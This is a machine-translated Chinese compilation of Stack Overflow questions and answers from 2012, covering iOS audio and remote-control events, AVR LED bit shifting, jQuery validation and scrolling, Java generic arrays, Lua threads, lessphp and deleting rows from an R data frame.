# StackOverflow 问答 12328000-12328999

# ios - monotouch远程控制事件不起作用

> ID：12328002
> 
> 赞同：3
> 
> 时间：2012-09-08T04:24:20.767
> 
> 标签：ios, events, xamarin.ios, controls

我想知道是否有用于单点触控的工作示例，该示例显示了接收远程控制事件（例如来自耳机按钮的事件）的工作示例。

我已经实现了一个单视图 iphone 应用程序，实现了 CanBecomeFirstResponder、BecomeFirstResponder 以及 UIApplication.SharedApplication.BeginReceivingRemoteControlEvents()，但我没有收到任何事件。

这是我的 SingleViewController 的代码。

```
public partial class SingleViewViewController : UIViewController
{
    public SingleViewViewController () : base ("SingleViewViewController", null)
    {
    }

    public override void DidReceiveMemoryWarning ()
    {
        // Releases the view if it doesn't have a superview.
        base.DidReceiveMemoryWarning ();

        // Release any cached data, images, etc that aren't in use.
    }

    public override void ViewDidLoad ()
    {
        base.ViewDidLoad ();

        // Perform any additional setup after loading the view, typically from a nib.
        AVAudioSession audioSession = AVAudioSession.SharedInstance();
        NSError error;
        audioSession.SetCategory(AVAudioSession.CategoryPlayback, out   error);
        audioSession.SetActive(true,out error);

        this.BecomeFirstResponder();
        UIApplication.SharedApplication.BeginReceivingRemoteControlEvents();
    }

    public override void ViewDidUnload ()
    {
        base.ViewDidUnload ();

        // Clear any references to subviews of the main view in order to
        // allow the Garbage Collector to collect them sooner.
        //
        // e.g. myOutlet.Dispose (); myOutlet = null;

        ReleaseDesignerOutlets ();
    }

    public override bool ShouldAutorotateToInterfaceOrientation (UIInterfaceOrientation toInterfaceOrientation)
    {
        // Return true for supported orientations
        return (toInterfaceOrientation != UIInterfaceOrientation.PortraitUpsideDown);
    }

    public override bool CanBecomeFirstResponder {
        get {
            return true;
        }
    }
    public override bool CanResignFirstResponder {
        get {
            return false;
        }
    }

    public override void RemoteControlReceived (UIEvent theEvent)
    {
        base.RemoteControlReceived (theEvent);
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-10T02:11:41.983

我花了一点时间在这上面，我想我可能会给你一个答案。我的第一个错误假设是遥控器（耳机）上的音量上下控制会注册，但他们没有。

除了通过反复试验，我还没有设法确认以下内容，但似乎您需要一个 AVAudioPlayer 播放某些东西，或者至少在您启动 AVAudioSession 时播放一些东西。在不播放任何内容的情况下，播放/停止事件会传递给处理它的音乐应用程序。

在您的代码中，在调用 base 后的 ViewDidLoad 方法中，我添加了

```
AVAudioPlayer player = new AVAudioPlayer(new NSUrl("Music/test.m4a", false), null);
player.PrepareToPlay();
player.Play(); 
```

如果您查看 GitHub 上这些示例的第 27 章，您将看到一个播放音频和处理远程控制事件的示例。

[https://github.com/mattneub/Programming-iOS-Book-Examples](https://github.com/mattneub/Programming-iOS-Book-Examples)

在没有播放器播放的情况下，我无法使远程控制事件正常工作，您的示例匹配了许多 Obj-C 示例，但我也无法使其在 Xcode 中工作。

希望这可以帮助。

# java - 绘制随机粗细线

> ID：12328008
> 
> 赞同：0
> 
> 时间：2012-09-08T04:26:35.307
> 
> 标签：java

我正在尝试使用`setStroke`并`BasicStroke`绘制随机粗细线。

这是绘画代码

```
 public void paintComponent(Graphics g1) {
        Random rand = new Random();
        Graphics g2 = (Graphics2D) g1;

        //set background color
        g2.setColor(Color.white);
        g2.fillRect(0, 0, getWidth(), getHeight());
        Dimension d = getPreferredSize();

        //set  line's color

        float r = rand.nextFloat();
        float g = rand.nextFloat();
        float b = rand.nextFloat();

        Color randomColor = new Color(r,g,b);

        g2.setColor(randomColor);

        //set line's stroke

        float width = rand.nextFloat();

        BasicStroke randomStroke = new BasicStroke(width);

        ((Graphics2D) g2).setStroke(randomStroke);

        for (Line2D.Double line : lines) {
            g2.drawLine(
                (int)line.getX1(),
                (int)line.getY1(),
                (int)line.getX2(),
                (int)line.getY2()
                );
        }
    } 
```

当我将笔画的宽度设置为某个数字时，它可以正确绘制。我查了一下这个`BasicStroke`类，它有以下参数：

```
 float width;
  int join;
  int cap;
  float miterlimit;
  float[] dash;
  float dash_phase; 
```

除了宽度，我不确定其他功能是什么。如何使用`BasicStroke`生成随机粗细线？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T04:35:21.823

我认为最大的问题是`nextFloat()`返回 0 和 1 之间的值 - 我猜你想要大于 1 的数字以便能够看到线条粗细的任何明显差异。

> 除了宽度，我不确定其他功能是什么。

请参阅[Javadocs](http://docs.oracle.com/javase/7/docs/api/java/awt/BasicStroke.html#BasicStroke%28float,%20int,%20int,%20float,%20float%5B%5D,%20float%29)。

# c - 用于点亮 LED 的 C 和 AVR pow 功能

> ID：12328010
> 
> 赞同：3
> 
> 时间：2012-09-08T04:26:50.380
> 
> 标签：c, arduino, avr, pow

我正在编写代码以使一组五个 LED 看起来像“Knight Rider”风格来回“反弹”。写入 PORTB 寄存器时，我注意到插入 LED 的方式不同，分别是 1、2、4、8、16。这些会打开相应的 LED。所以我想通过使用`pow`函数将寄存器设置为 2 的值循环到 LED 编号（0、1、2、3、4）。但它不能正常工作。

```
#include <avr/io.h>
#include <inttypes.h>
#include <math.h>

void delay(uint16_t x);
//void buttons(int b1, int b2);

int led = 0;
int inc = 1;
unsigned int ledpow = 0;

int main(void)
{
    DDRB |= (1<<PORTB0); //Set PORTB0 (pin 8) as an output
    DDRB |= (1<<PORTB1); //Set PORTB1 (pin 9) as an output
    DDRB |= (1<<PORTB2); //Set PORTB2 (pin 10) as an output
    DDRB |= (1<<PORTB3); //Set PORTB3 (pin 11) as an output
    DDRB |= (1<<PORTB4); //Set PORTB4 (pin 12) as an output
    DDRD &= ~(1<<PORTD3); //Set PORTD3 (pin 3) as an input
    DDRD &= ~(1<<PORTD4); //Set PORTD4 (pin 4) as an input
    PORTB = 0; //Disable Pull-up resistors for PORTB
    PORTD = 0; //Disable Pull-up resistors for PORTD

    while(1)
    {
        while((PIND & (1<<PORTD3)) != 0) {
            //Do nothing, just pause the program
        }

        ledpow = pow(2,led);
        PORTB = ledpow;

        led = led + inc;

        if ((led == 4) || (led==0)) {
            inc = -inc;
        }

        if((PIND & (1<<PORTD4)) != 0) {
            delay(50);
        }
        else {
            delay(100);
        }
    }
}

void delay(uint16_t x)
{
    uint16_t i,j;

    for(i=0;i<x;i++)
        for(j=0;j<1000;j++)
            ;
    return;
} 
```

为什么这不起作用？我让它使用 switch/case 语句。我测试了该`pow`函数通过做`PORTB = pow(2,0);`以及变量“led”的其他权力来工作。那工作正常。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T04:32:45.050

因为 pow 函数返回一个浮点数，它不是它应该表示的值的精确表示（而且，数学函数使用近似值工作）。所以可能`pow(2, 3)`不返回 8 而是 7.99856 或 8.0000261 等。在前一种情况下，你搞砸了，因为当你将它分配给端口时，它会被截断为整数（端口保存整数，对吗？）并丢失它的小数部分，形成 7 来点亮所有 3 个第一个 LED。

对于整数运算， pow 函数也是过期的，你在浪费你的镜头。我想知道你为什么不`PORTB = 1 << led;`使用它来设置其他端口状态......

此外，您的延迟循环非常不便携。深入了解 AVR-libc 的文档，有两个延迟循环函数可以提供几乎精确的时间延迟。您可以在我的 AVR 实用程序库中查看如何使用它们：http: [//github.com/H2CO3/libavrutil](http://github.com/H2CO3/libavrutil)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T04:33:48.517

你不应该使用`pow()`. 您可以[`pow()`在 C++ 参考](http://www.cplusplus.com/reference/clibrary/cmath/pow/)中找到有关信息。

但是，本质上，整数没有`pow()`签名：

> ```
>  double pow (      double base,      double exponent );
> long double pow ( long double base, long double exponent );
>       float pow (       float base,       float exponent );
>      double pow (      double base,         int exponent );
> long double pow ( long double base,         int exponent ); 
> ```

这意味着在运行时，它可能不起作用，因为它会对结果进行四舍五入。它需要浮点库（在 AVR 上的软件中完全实现）——速度慢且占用空间。

`PORTB = pow(2,0);`可能会起作用，因为它是 a `constexpr`，因此可以在编译时进行评估。

相反，请尝试使用左移运算符，例如：

```
PORTB = 1 << led; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-10-28T17:39:28.013

您最好的方法是完全避免 pow 。端口不进行操作，而是使用 digitalWrite 功能。

```
void setup() {
    for (uint8_t pin=0; pin<20; ++pin) {
        pinMode(pin, OUTPUT);
    }
}

void blink(const uint8_t pos) {
    digitalWrite(pos, HIGH);
    delay(200);
    digitalWrite(pos, LOW);
}

void loop() {
    for (uint8_t pos=0; pos<19; ++pos) {
        blink(pos);
    }
    for (uint8_t pos=19; pos>0; --pos) {
        blink(pos);
    }
} 
```

更复杂的骑士版本可以在我的博客[here](http://blog.blinkenlight.net/experiments/basic-effects/knight-rider/)和[here中找到](http://blog.blinkenlight.net/experiments/removing-flicker/knight-rider-no-flicker/)

# vb.net - 如何结合 Vb.net 项目和 Crypto Obfuscator 来生成受保护的程序

> ID：12328014
> 
> 赞同：0
> 
> 时间：2012-09-08T04:27:31.537
> 
> 标签：vb.net, crypto-obfuscator

我有一个现有的 VB 项目，它使用 InstallShield 创建安装文件。我的“解决方案”包括 2 个项目（程序和安装程序）。我想做的是使用 Crypto Obfuscator 来保护程序。我不知道从哪里开始，帮助文件非常简短，对我有限的知识没有帮助。我该怎么做呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T06:44:43.783

您需要将混淆功能集成到构建过程中，以便在构建程序集后立即对其进行混淆，并且 InstallShield 能够获取和查看经过混淆的程序集。

要将混淆集成到您的构建过程中，请从 Crypto Obfuscator File Menu -> 选择“Visual Studio Project Integration Wizard” - 在您的 .sln 上运行此向导并完成集成。

如果您需要更多帮助或信息，请联系我们的支持 - 我们很乐意提供帮助。

[免责声明：我为Crypto Obfuscator](http://www.ssware.com/cryptoobfuscator/obfuscator-net.htm)的开发人员 LogicNP Software 工作。

# javascript - javascript 好的部分、匿名函数、jquery validate 和 (json?)

> ID：12328016
> 
> 赞同：0
> 
> 时间：2012-09-08T04:28:00.517
> 
> 标签：javascript, jquery, json, anonymous-function

我可以创建一个单独的函数，但这可以在一行中完成，所以 anon 函数对我来说似乎是正确的。到目前为止，这是我所拥有的，它返回了一个语法错误。

```
$('#submitAll').validate({
    rules: {
      preferred: {
        required: true,
        validPreferred: $('#preferred').val(),
        remote: {
          type: "post",
          url: "./postlocation.php",
          contentType: "application/json; charset=utf-8",
          async: false,
          data: {
            phone: {
              //Write me, function getPreferred(preferred.val)
              'number': {function(idPhone){return idPhone.val();}: $('#preferred')},
              'sid': Math.random()
            }
          }
        } 
      }
    } 
```

不要被关闭的波浪线挂断。我正在尝试将数据中的“数字”字段设置为 $('#preferred').val()。

现在，我认为甚至可以不使用匿名函数，但这需要多个级别的 $，而且我不确定我的猿脑是否可以接受。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T05:35:45.403

Ok, thanks Mohammad, here it is: Again, I had to bury the damn $'s but oh well, I like this solution.

```
$('#submitAll').validate({
    rules: {
      preferred: {
        required: true,
        //write me, function(preferredValue){return true || false}
        validPreferred: $('#preferred').val(),
        remote: {
          type: "post",
          url: "./postlocation.php",
          contentType: "application/json; charset=utf-8",
          data: {
            phone: {
              //Write me, function getPreferred(preferred.val)
              'number': (function(idPhone) {
                          return $('#'+idPhone).val();
                        })($('#preferred').val()),
              'sid': Math.random()
            }
          }
        } 
      }
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T04:37:28.333

这是正确的！'number' 属性后使用的 JSON 表达式有语法错误。谁说“函数”在“{”之后？！这是完全错误的。另外请使用嵌套编码样式，这是为了您的利益，而不是其他任何人。尝试这个：

```
$('#submitAll')
.validate(
    {
        rules: {
            preferred: {
                required: true,
                validPreferred: $('#preferred').val(),
                remote: {
                    type: "post",
                    url: "./postlocation.php",
                    contentType: "application/json; charset=utf-8",
                    async: false,
                    data: {
                        phone: {
                            //Write me, function getPreferred(preferred.val)
                            'number': (
                                function(idPhone)
                                {
                                    return (idPhone.val()) ? idPhone.val() : $('#preferred').val();
                                }
                            )($("WHERE IS THE idPhone variable?!")),
                            'sid': Math.random()
                        }
                    }
                } 
            }
        }
    }
); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-08T04:32:29.967

编辑：现在我终于明白你想要做什么，我的建议是：

```
'number': $('#' + $('#preferred').val()).val() 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-08T04:34:20.270

jslint

[http://www.jslint.com/](http://www.jslint.com/)

把它当作你最好的朋友

```
jsl -process myfile.js 
```

^ 会发现你的语法错误

# c++ - Lua c-api：如何识别 lua_pushcclosure 回调中涉及的协程/线程？

> ID：12328021
> 
> 赞同：1
> 
> 时间：2012-09-08T04:31:13.387
> 
> 标签：c++, c, lua, lua-5.2

有没有办法知道执行 Lua 脚本的线程（协程）是 lua_pushcclosure 调用的来源？

为了管理一些与 lua 线程相关的东西（延迟暂停/恢复或私有线程变量），我需要识别回调中涉及的线程。我知道我可以在使用 lua_gettop 创建线程索引时获取它，但我找不到使用它的方法，因此当从 Lua 脚本发出 lua_pushcclosure 调用时它有助于识别线程。

我当前的系统允许嵌套脚本调用，因此脚本可以执行其他脚本（每个嵌套脚本调用创建一个具有相同 lua_state 的新线程。因此 lua_state 用于获取堆栈中的多个线程条目。）

我正在使用 Lua 5.2

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-08T15:00:07.430

如果你在一个从 Lua 调用的 C 函数中，并且你想知道你在哪个线程中......只需调用[`lua_pushthread(L)`](http://www.lua.org/manual/5.2/manual.html#lua_pushthread).

# vb.net - 在运行时将私有变量变为公共变量？

> ID：12328023
> 
> 赞同：0
> 
> 时间：2012-09-08T04:31:53.287
> 
> 标签：vb.net, variables, object, components, windows-forms-designer

请看附图。![在此处输入图像描述](../Images/6e760a317244ef8c71db70cc3c213f17.png)

我希望它是

```
Public components As System.ComponentModel.lContainer 
```

但是每次我编辑表单设计时，它总是变回原来的代码

```
Private components As System.ComponentModel.lContainer 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-08T04:40:58.707

你可以在你的类中有一个公共属性，它返回一个私有成员，就像你的一样。此代码由表单设计器生成，您可能无法更改其行为。即使可以，我也不建议您这样做。

```
Public Class MyForm

    Public Property Container As System.ComponentModel.IContainer

        Get

            Return Me.components

        End Get

    End Property

End Class 
```

干杯

# jquery - jQuery AJAX load not working on a local server

> ID：12328025
> 
> 赞同：0
> 
> 时间：2012-09-08T04:31:59.487
> 
> 标签：jquery

im experimenting locally with jQuery and its load() function. I have this JS code:

```
$(document).ready(function(){
  $("img.menu").click(function(){
    $("div#content").load("about.html");
  });
}); 
```

It references to

```
<td><img id="toolbar" class="menu" src="toolbar/about.png" /></td> 
```

and its supposed to load the about.html file that its on the same folder:

```
<p>some text...</p> 
```

And it should get loaded at:

```
<div id="content">
<p>Content</p>
</div> 
```

Im following [this](http://www.jquery-tutorial.net/ajax/the-load-method/) tutorial

I dont know what im doing wrong but it doesnt get displayed. Im using jQuery-1.8.0 btw EDIT: Im following [this](http://www.w3schools.com/jquery/tryit.asp?filename=tryjquery_ajax1) code model too, but with html files like the other tutorial

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T04:47:34.820

You might not be running a server.. Remember that theses calls needs a server to run on. Wamp will do. If not try consoling.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T04:49:02.127

try this one instead of `load`

```
$(document).ready(function(){
  $("img.menu").click(function(){
    $.get('about.html', function (data) {
         $("div#content").html(data);
    });
  });
}); 
```

# ios - 如何删除插座的所有参考

> ID：12328026
> 
> 赞同：28
> 
> 时间：2012-09-08T04:32:01.660
> 
> 标签：ios, objective-c, xcode

我不小心将命令按钮的事件设置为“出口”而不是“动作”。由于自动拖动功能，xcode 在 applicationDelegate 和 .h 和 .m 文件中生成了引用。我从 .h 和 .m 文件中删除了该条目，但模拟器无法运行，因为它仍在寻找缺少的参考。我在任何地方都找不到那个出口。我对 iOS 编程相当陌生。任何人都可以为此提出解决方案吗？

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2012-09-08T04:34:50.453

您必须从界面构建器中的项目中取消连接出口。选择您将插座链接到的 UI 元素，然后在“连接检查器”中将其删除。

![在此处输入图像描述](../Images/18dfe5fda5d5be56e1427311b9aaeae4.png)

点击小“x”^^^

* * *

## 回答 #2

> 赞同：30
> 
> 时间：2016-05-19T13:26:03.407

我认为人们可能会出于两个不同的原因来到这里，想知道如何摆脱不需要的 Outlet 引用。

1.  在使用 Interface Builder 时创建了一个不需要的插座。
2.  从另一个项目 View Controller 复制了一些 Outlet 代码。

这两个原因都很容易解决。

# IB中不需要的出口

**方法一**

右键单击故事板中的视图，然后单击引用插座旁的小 x。

[![在此处输入图像描述](../Images/f1b4eb3678b49b1bdfd4c77588f26481.png)](https://i.stack.imgur.com/T0Xx2.png)

**方法二**

右键单击文档大纲中的视图名称。然后单击参考插座旁边的小 x。

[![在此处输入图像描述](../Images/d9f9ea7b57abc836e47cdaf92be74be3.png)](https://i.stack.imgur.com/sZ9Cf.png)

**方法三**

选择故事板上的视图，然后单击 Connections Inspector。然后您可以单击小 x 以删除插座参考。

[![在此处输入图像描述](../Images/6c4feb0387286f6a5025189373962929.png)](https://i.stack.imgur.com/H9goP.png)

# 代码中不需要的引用

如果您将视图控制器代码从一个项目复制到另一个项目中，您会注意到插座发生了一件奇怪的事情。它引用了第一个项目的视图，而您从未连接任何插座！

[![在此处输入图像描述](../Images/f6d12f95493c96b7f1266566119fe299.png)](https://i.stack.imgur.com/yUOfi.png)

如果您左键单击小圆圈并单击参考链接，您甚至会被带到另一个项目中的情节提要视图。试图弄清楚如何摆脱这个参考可能会让你发疯。

好吧，好消息是你真的没有什么需要解决的。您没有复制一些深入的、难以找到的参考链接。Xcode 只是感到困惑，因为两个项目中的 View Controller 和 outlet 名称相同。基本上只是忽略那个小圆圈所说的。您可以关闭第一个项目，Xcode 最终会解决问题。使用此答案第一部分中的方法来查看当前项目中的视图是否具有引用插座。

无需删除派生数据。无论如何，这并不能解决问题。只需尝试再次同时打开两个项目，您将得到相同的奇怪行为。我想出的方法是分别创建两个新项目，它们具有同名的视图控制器和同名的引用插座。我从来没有复制过任何东西，但 Xcode 显示一个正在引用另一个。就像我说的，忽略它。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-09-08T04:35:00.997

它也将列在故事板/xib 中的命令按钮插座上。

也从那里删除它，你应该很好。

# php - Codeigniter - 用户身份验证/登录插件/类？

> ID：12328030
> 
> 赞同：1
> 
> 时间：2012-09-08T04:32:41.983
> 
> 标签：php, codeigniter, authentication, authorization

> **可能重复：**
> [我应该如何为 CodeIgniter 选择身份验证库？](https://stackoverflow.com/questions/346980/how-should-i-choose-an-authentication-library-for-codeigniter)

这里有人使用 Codeigniter 的用户登录/注册类吗？我到处看了看，似乎没有一个“入门”课程，不仅处于开发的早期阶段（不是很成熟）

有谁知道有什么推荐的吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T04:44:59.743

[http://benedmunds.com/ion_auth/](http://benedmunds.com/ion_auth/)

我在最近的所有 CI 项目中都使用过它。所以我推荐它。

[此外，它是pyrocms](https://www.pyrocms.com/)`users`模块中注册/身份验证过程的基础，这是一个“上升”的基于 CI 的 CMS。所以它会在很长一段时间内得到支持......

# ios - iOS：如何方便地存储和播放许多 mp3 文件

> ID：12328036
> 
> 赞同：1
> 
> 时间：2012-09-08T04:33:36.723
> 
> 标签：ios, audio, mp3

我有一个包含大约 2000 个短 mp3 文件的程序。我现在将所有这些文件存储到文件夹`Supporting Files`中，当我想玩时，我调用这个函数：

```
-(void)playSound:(NSString *)mySoundFileName{
    NSString *filePath = [[NSBundle mainBundle] pathForResource:mySoundFileName ofType:@"mp3"];  
    if ([NSData dataWithContentsOfFile:filePath]) {  
        url = [NSURL fileURLWithPath:filePath];
        audioPlayer = [[AVAudioPlayer alloc]
                           initWithContentsOfURL:url
                           error:nil];
        [audioPlayer play];  
    } 
} 
```

但是，我第一次播放声音时，搜索/加载文件总是需要很长时间。更具体地说，在按下“播放声音”按钮播放声音后，我必须等待至少 5 秒才能播放。之后播放其他声音就可以了，即当我按下“播放声音”按钮时它几乎立即播放。您有什么建议可以更有效地存储和播放这些文件吗？非常感谢你

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-08T04:38:21.080

有时，AVAudioPlayer 最初开始播放可能会花费不希望的时间。解决这个问题的一个好方法是在调用 play 之前进行初始 alloc/init。这样玩家就可以在用户按下播放按钮之前播放。此外，在游戏前调用`[player prepareToPlay];`将有助于稍微提高性能。

# php - 如何为 Bootstrap 使用/编译 LESS？

> ID：12328039
> 
> 赞同：2
> 
> 时间：2012-09-08T04:33:48.877
> 
> 标签：php, twitter-bootstrap, less

我想利用 Twitter Bootstrap，但也想用 php 而不是 js 编译 LESS 任何人都可以发布一个如何使用 php 执行此操作的示例，因为我无法在网上找到任何参考。我是 LESS 和 Bootstrap 的新手，所以请添加一些细节。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-09T02:56:15.943

您可以尝试使用[lessphp](http://leafo.net/lessphp/)。

编译 Bootstrap LESS 文件的简单设置是：

```
<?php
  require "lessc.inc.php";

  $less = new lessc;
  $less->checkedCompile("bootstrap.less", "bootstrap.css");
  $less->checkedCompile("bootstrap-responsive.less", "bootstrap-responsive.css"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-21T09:50:31.857

您也可以在本地机器上编译 LESS。有很多 GUI 应用程序可以帮助您。

另请参阅此问题：[Compile a referenced LESS file into CSS with PHP automatically](https://stackoverflow.com/questions/12274628/how-to-compile-less-server-side-with-php)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-06-10T00:57:46.193

[http://lessphp.gpeasy.com/Bootstrap](http://lessphp.gpeasy.com/Bootstrap)用于引导 3.1.1 的少 php 编译器

# java - Java 如何：从具有泛型的类创建泛型数组？

> ID：12328042
> 
> 赞同：3
> 
> 时间：2012-09-08T04:34:02.100
> 
> 标签：java, generics

我有一个 class`FirstClass<O>`和一个 class `SecondClass<O>`，我想在`SecondClass<O>`一个调用 from 的例程中创建一个 O[] `FirstClass<O>`，其中 O 是一个通用类参数。我找不到如何做到这一点。

我需要一个 O[] 专门（而不是`ArrayList<O>`或类似），因为我需要经常在循环体内从中获取元素，这对我的算法的执行时间很重要。

所以我想要一些类似的东西。

```
public class FirstClass<O> {
    void someRoutine(n and other params) {
        //Do some stuff
        SecondClass<O> = new SecondClass(n, possibly_other_params);
        //Do some stuff
    }
} 
```

和

```
public class SecondClass<O> {
    O[] myArray;
    SecondClass<O>(int n, possibly_other_params) {
        //Here the constructor that creates an O[n]
    }
} 
```

我在网上找到了一些方法，但不适用于我的情况：

*   使用`O[] array = (O[]) new Object[n];`但不会编译。
*   每次我从数组请求某些东西时使用`Object[] array = new Object[n];`并执行 (O) 强制转换，但这太慢了
*   使用`Array.newInstance(Class<O> type, int n);`, with `O o;`and`type=o.class`但它抱怨`type`现在是 type`Class<CAP#1>`而不是 type `Class<O>`，无论 CAP#1 是什么意思......

在考虑最佳执行速度的情况下，我应该如何在 Java 中正确执行此操作？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-08T05:57:19.937

Java 对泛型的处理非常粗略，但如果您准备进行一些小的调整，您可以完成一些接近您想要的事情。请参见：

```
public class FirstClass<O> {
    Class<O> type;

    public static <O> FirstClass<O> create(Class<O> type) {
        return new FirstClass<O>(type);
    }

    public FirstClass(Class<O> type) {
        this.type = type;
    }

    public void routine(int size /*, other params */ ) {
        SecondClass<O> instance = new SecondClass<O>(type, size);
    }
}

public class SecondClass<O> {
    public O[] array;

    @SuppressWarnings("unchecked")
    public SecondClass(Class<O> type,int size) {
        array = (O[])Array.newInstance(type,size);
    }
} 
```

还有一个用例：

```
FirstClass<Integer> instance = FirstClass.create(Integer.class);
instance.routine(110); 
```

这只是一个粗略的例子，尽管我相信您可以在不必使用这种方法的情况下完成类似的事情。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-09T08:59:33.927

> 使用 O[] 数组 = (O[]) new Object[n]; 但这每次我从数组中请求某些东西时都需要（O）强制转换，所以这太慢了

什么？类型的全部意义在于，当你从中取出东西时`O[]`，你*不需要*演员表`(O)`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-08T04:56:28.480

从上面重复我的评论，希望将此问题标记为已回答：

你真的分析过这个吗？选角实际上是导致您的性能问题的原因吗？鉴于 Java 中的泛型在运行时被删除，我看不到一个简单的解决方法来让它按您的预期工作。我认为您最好尝试重新访问您预期的 API，然后尝试让 Java 的泛型以您想要的方式工作。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-08T05:01:26.980

这是源[代码](http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/util/ArrayList.java#ArrayList.set%28int%2Cjava.lang.Object%29)：`ArrayList.set`

```
public E set(int index, E element) {
    rangeCheck(index);

    E oldValue = elementData(index);
    elementData[index] = element;
    return oldValue;
} 
```

当然，它会进行额外的查找以获取您不关心的旧元素，但这是我们正在谈论的随机访问（阅读：O(1) 时间）。`ArrayList`除非你有硬性数字来表明它正在减慢你的速度，否则就使用它。

# jquery - 使用 jQuery 自动向下滚动动画

> ID：12328050
> 
> 赞同：1
> 
> 时间：2012-09-08T04:36:05.247
> 
> 标签：jquery, scroll

我正在尝试使用 jQuery 动画滚动到底部按钮，当页面位于底部时会淡出。我在互联网上找到了这段代码并对其进行了修改，但我无法让它工作。

```
 <script>
    //to bottom
    $(document).ready(function(){

        // hide #back-top first

        $("#back-bottom").show();

        // fade in #back-top
        $(function () {
            $(window).scroll(function () {
                if ($(this).scrollTop()  1) {
                    $('#back-bottom').hide();
                } else {
                    $('#back-bottom').show();
                }
            });

            // scroll body to 0px on click
            $('#back-bottom a').click(function () {
                $('body,html').animate({ scrollTop: 0 }, 800);
                return false;
            });
        });

    });
    </script> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-08T04:40:01.117

我认为您需要计算身体高度并将其传递给动画中的 scrollTop 参数

```
$('body,html').animate({ scrollTop: $('body').height() }, 800); 
```

~~[在这里查看工作演示]~~// 链接已停止工作

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-08T04:47:06.523

```
$('#back-bottom a').click(function () {
                $('body,html').animate({ scrollTop: $('body').height() }, 500);
                return false;
            }); 
```

我想它会为你工作

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-08T04:52:29.487

创建了一个有效的示例小提琴：

[http://jsfiddle.net/z5JNc/](http://jsfiddle.net/z5JNc/)

将隐藏按钮的条件更改为：`if($(window).scrollTop() + $(window).height() == $(document).height())`

要滚动回顶部，添加了一个获取正文高度的变量： `var $elem = $('body')` 然后当单击链接时，将值更改为： `scrollTop: $elem.height()`

# r - 如何删除数据框中的行？

> ID：12328056
> 
> 赞同：280
> 
> 时间：2012-09-08T04:37:33.177
> 
> 标签：r, dataframe, row

我有一个名为“mydata”的数据框，如下所示：

```
 A  B  C   D 
1\. 5  4  4   4 
2\. 5  4  4   4 
3\. 5  4  4   4 
4\. 5  4  4   4 
5\. 5  4  4   4 
6\. 5  4  4   4 
7\. 5  4  4   4 
```

我想删除第 2、4、6 行。例如，像这样：

```
 A  B  C   D
1\. 5  4  4  4 
3\. 5  4  4  4 
5\. 5  4  4  4 
7\. 5  4  4  4 
```

* * *

## 回答 #1

> 赞同：418
> 
> 时间：2012-09-08T04:39:37.100

关键思想是您形成一组要删除的行，并保留该组的补码。

在 R 中，集合的补码由“-”运算符给出。

所以，假设`data.frame`被称为`myData`：

```
myData[-c(2, 4, 6), ]   # notice the - 
```

当然，`myData`如果您想完全删除这些行，请不要忘记“重新分配”——否则，R 只会打印结果。

```
myData <- myData[-c(2, 4, 6), ] 
```

* * *

## 回答 #2

> 赞同：99
> 
> 时间：2012-09-08T10:57:18.140

您还可以使用所谓的布尔向量，也就是`logical`：

```
row_to_keep = c(TRUE, FALSE, TRUE, FALSE, TRUE, FALSE, TRUE)
myData = myData[row_to_keep,] 
```

请注意，`!`运算符充当 NOT，即`!TRUE == FALSE`：

```
myData = myData[!row_to_keep,] 
```

与@mrwab 的答案（+1 btw :)）相比，这似乎有点麻烦，但可以动态生成逻辑向量，例如，列值超过某个值：

```
myData = myData[myData$A > 4,]
myData = myData[!myData$A > 4,] # equal to myData[myData$A <= 4,] 
```

您可以将布尔向量转换为索引向量：

```
row_to_keep = which(myData$A > 4) 
```

最后，一个非常巧妙的技巧是，您不仅可以将这种子集用于提取，还可以用于赋值：

```
myData$A[myData$A > 4,] <- NA 
```

其中列`A`被分配`NA`（不是数字）`A`超过 4。

* * *

## 回答 #3

> 赞同：78
> 
> 时间：2017-05-15T05:51:34.367

### 按行号删除的问题

对于快速和肮脏的分析，您可以根据最佳答案按数字删除 data.frame 的行。IE，

```
newdata <- myData[-c(2, 4, 6), ] 
```

但是，如果您尝试编写一个健壮的数据分析脚本，您通常应该避免按数字位置删除行。这是因为您的数据中的行顺序将来可能会发生变化。data.frame 或数据库表的一般原则是行的顺序无关紧要。如果顺序确实很重要，则应将其编码在 data.frame 中的实际变量中。

例如，假设您在检查数据并确定要删除的行的行号后导入数据集并按数字位置删除行。但是，稍后，您会进入原始数据并查看并重新排序数据。您的行删除代码现在将删除错误的行，更糟糕的是，您不太可能收到任何警告您已发生这种情况的错误。

### 更好的策略

更好的策略是根据行的实质性和稳定属性删除行。例如，如果您有一个`id`唯一标识每个案例的列变量，您可以使用它。

```
newdata <- myData[ !(myData$id %in% c(2,4,6)), ] 
```

其他时候，您将有一个可以指定的正式排除标准，并且您可以使用 R 中的许多子集工具之一来根据该规则排除案例。

* * *

## 回答 #4

> 赞同：15
> 
